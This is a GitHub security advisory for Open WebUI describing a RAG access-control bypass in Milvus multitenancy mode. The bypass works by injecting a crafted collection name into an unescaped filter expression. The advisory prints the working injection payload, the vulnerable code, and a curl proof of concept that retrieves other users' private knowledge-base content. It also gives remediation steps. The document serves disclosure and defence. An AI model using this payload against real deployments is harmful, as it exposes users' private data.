# [M] Open WebUI: RAG ACL Bypass in Milvus Multitenancy Mode

## Summary
Severity: Medium
Advisory: GHSA-p5cp-r7rg-qpxc
CVE: CVE-2026-54019
CWE: CWE-862, CWE-943
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-p5cp-r7rg-qpxc
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.6

## Details
# RAG ACL Bypass in Milvus Multitenancy Mode

## Summary

This is a bypass of the fix for:

- GHSA-h36f-rqpx-j5wx
- CVE-2026-44560
- "Unauthorized File and Knowledge Base Content Access via RAG Vector Search"

Open WebUI added collection-level ACL checks, but the patch can still be bypassed when Milvus multitenancy mode is enabled. The ACL allows unknown non-KB collection names as legacy/ephemeral collections. In Milvus multitenancy mode, that user-controlled collection name becomes a `resource_id` and is interpolated into a Milvus expression without escaping.

An authenticated non-admin user can query:

```text
x' or resource_id != '' or resource_id == 'x
```

This passes the Open WebUI ACL as an unknown collection, but Milvus evaluates:

```text
resource_id == 'x' or resource_id != '' or resource_id == 'x'
```

That returns private knowledge-base chunks belonging to other users.

## Affected Configuration

Tested on:

```text
Open WebUI: v0.9.5, commit 3660bc00f
VECTOR_DB=milvus
ENABLE_MILVUS_MULTITENANCY_MODE=true
```

This is **not a default-vector-store issue**. It affects **production deployments using Milvus multitenancy.**

## Impact

An authenticated low-privilege user can read private RAG / knowledge-base content they do not have access to. No victim interaction is required.

## Root Cause

ACL permits unknown collection names:

```python
# backend/open_webui/retrieval/utils.py
elif not await Knowledges.get_knowledge_by_id(name):
    validated.add(name)
```

Milvus multitenancy then treats the same name as `resource_id` and builds unsafe expressions:

```python
# backend/open_webui/retrieval/vector/dbs/milvus_multitenancy.py
expr=f"{RESOURCE_ID_FIELD} == '{resource_id}'"
```

Affected paths include:

```text
POST /api/v1/retrieval/query/collection
POST /api/v1/retrieval/query/doc
```

## PoC

Request:

```bash
curl -s -X POST "$TARGET/api/v1/retrieval/query/collection" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  --data-binary @- <<'JSON'
{
  "collection_names": [
    "x' or resource_id != '' or resource_id == 'x"
  ],
  "query": "anything",
  "k": 10,
  "hybrid": false
}
JSON
```

Actual result: private chunks from other users' knowledge collections are returned.

Expected result: request should be rejected with 403 or return no unauthorized content.

## Remediation

1. Do not allow arbitrary unknown collection names in user-controlled RAG query endpoints.
2. Escape or parameterize Milvus expression values before building filters.
3. Reject collection names containing quotes/control characters unless they match a known internal format.
4. Add a regression test for this payload in Milvus multitenancy mode:

```text
x' or resource_id != '' or resource_id == 'x
```

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-p5cp-r7rg-qpxc
- https://nvd.nist.gov/vuln/detail/CVE-2026-54019
- https://github.com/advisories/GHSA-p5cp-r7rg-qpxc
- https://github.com/open-webui/open-webui
- https://github.com/pypa/advisory-database/tree/main/vulns/open-webui/PYSEC-2026-2750.yaml
- https://pypi.org/project/open-webui
